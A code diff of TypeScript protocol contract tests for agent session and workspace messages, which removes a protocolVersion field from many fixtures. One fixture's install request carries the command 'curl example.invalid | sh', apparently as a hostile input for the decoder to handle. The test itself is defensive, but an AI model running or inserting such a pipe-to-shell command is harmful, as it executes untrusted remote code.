@@ -29,7 +29,6 @@ import {
   encodeSessionReadyEvent,
   encodeSessionUsageUpdatedEvent,
   encodeWorkspaceListCommand,
-  MOBIUS_PROTOCOL_VERSION,
   ProtocolMessageError,
   SESSION_CONFIGURE_KIND,
   SESSION_ELICITATION_REQUESTED_KIND,
@@ -93,7 +92,6 @@ describe("ACP session control protocol contract", () => {
           costCurrency: "USD",
           hasCost: true,
           kind: SESSION_USAGE_UPDATED_KIND,
-          protocolVersion: MOBIUS_PROTOCOL_VERSION,
           sessionId: "session-1",
           size: 200_000,
           used: 50_000,
@@ -111,7 +109,6 @@ describe("ACP session control protocol contract", () => {
             _meta: null,
             commandId: "command-1",
             kind: SESSION_USAGE_UPDATED_KIND,
-            protocolVersion: MOBIUS_PROTOCOL_VERSION,
             sessionId: "session-1",
             source: "prompt",
             usage: { inputTokens: 60, outputTokens: 40, totalTokens },
@@ -147,7 +144,6 @@ describe("ACP session control protocol contract", () => {
         },
         commandId: "command-1",
         kind: SESSION_USAGE_UPDATED_KIND,
-        protocolVersion: MOBIUS_PROTOCOL_VERSION,
         sessionId: "session-1",
         source: "prompt",
         usage: {
@@ -202,13 +198,11 @@ describe("ACP session control protocol contract", () => {
     const command: AgentInstallRequestCommand = {
       agentId: "codex",
       kind: AGENT_INSTALL_REQUEST_KIND,
-      protocolVersion: MOBIUS_PROTOCOL_VERSION,
       requestId: "install-1",
     };
     const awaitingApproval: AgentInstallAwaitingApprovalEvent = {
       agentId: "codex",
       kind: AGENT_INSTALL_AWAITING_APPROVAL_KIND,
-      protocolVersion: MOBIUS_PROTOCOL_VERSION,
       requestId: "install-1",
     };
 
@@ -231,7 +225,6 @@ describe("ACP session control protocol contract", () => {
           agentId: "codex",
           command: "curl example.invalid | sh",
           kind: AGENT_INSTALL_REQUEST_KIND,
-          protocolVersion: MOBIUS_PROTOCOL_VERSION,
           requestId: "install-1",
         }),
       ),
@@ -245,7 +238,6 @@ describe("ACP session control protocol contract", () => {
       bindingId: "workspace",
       directoryId: "default",
       kind: SESSION_PREPARE_KIND,
-      protocolVersion: MOBIUS_PROTOCOL_VERSION,
       requestId: "request-1",
       sessionId: "session-1",
     };
@@ -271,7 +263,6 @@ describe("ACP session control protocol contract", () => {
       directoryId: "default",
       directoryLabel: "mobius",
       kind: SESSION_READY_KIND,
-      protocolVersion: MOBIUS_PROTOCOL_VERSION,
       requestId: "request-1",
       restored: false,
       sessionId: "session-1",
@@ -293,7 +284,6 @@ describe("ACP session control protocol contract", () => {
       cwd: "/tmp/untrusted",
       directoryId: "default",
       kind: SESSION_PREPARE_KIND,
-      protocolVersion: MOBIUS_PROTOCOL_VERSION,
       requestId: "request-1",
       sessionId: "session-1",
     });
@@ -312,7 +302,6 @@ describe("ACP session control protocol contract", () => {
       configId: "model",
       directoryId: "default",
       kind: SESSION_CONFIGURE_KIND,
-      protocolVersion: MOBIUS_PROTOCOL_VERSION,
       requestId: "request-2",
       sessionId: "session-1",
       value: "codex-1",
@@ -323,7 +312,6 @@ describe("ACP session control protocol contract", () => {
       costCurrency: "USD",
       hasCost: true,
       kind: SESSION_USAGE_UPDATED_KIND,
-      protocolVersion: MOBIUS_PROTOCOL_VERSION,
       sessionId: "session-1",
       size: 200_000,
       source: "context",
@@ -350,7 +338,6 @@ describe("ACP session control protocol contract", () => {
           optionId: "allow-once",
         },
       ],
-      protocolVersion: MOBIUS_PROTOCOL_VERSION,
       sessionId: "session-1",
       title: "Run tests",
       toolCallId: "tool-1",
@@ -384,7 +371,6 @@ describe("ACP session control protocol contract", () => {
       kind: SESSION_ELICITATION_REQUESTED_KIND,
       message: "Which branch should be reviewed?",
       mode: "form",
-      protocolVersion: MOBIUS_PROTOCOL_VERSION,
       sessionId: "session-1",
       url: "",
     };
@@ -420,7 +406,6 @@ describe("ACP session control protocol contract", () => {
       contentId: "content-1",
       kind: AGENT_CONTENT_KIND,
       messageId: "message-1",
-      protocolVersion: MOBIUS_PROTOCOL_VERSION,
       sessionId: "session-1",
     };
 
@@ -436,7 +421,6 @@ describe("workspace directory protocol", () => {
       bindingId: "workspace",
       directoryId: "home",
       kind: WORKSPACE_LIST_KIND,
-      protocolVersion: MOBIUS_PROTOCOL_VERSION,
       requestId: "directory-request-1",
     };
 
